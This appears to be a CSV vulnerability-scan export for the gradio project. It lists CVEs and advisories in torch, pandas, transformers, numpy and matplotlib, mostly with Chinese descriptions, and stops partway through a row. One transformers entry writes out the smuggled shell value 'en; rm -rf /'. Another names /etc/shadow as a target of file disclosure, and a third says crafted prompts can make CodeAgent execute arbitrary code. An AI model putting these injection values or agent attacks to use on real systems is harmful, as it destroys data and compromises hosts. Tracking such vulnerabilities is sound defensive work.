gradio-app_gradio,torch,1.12.0,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,1.12.0,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,matplotlib,,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
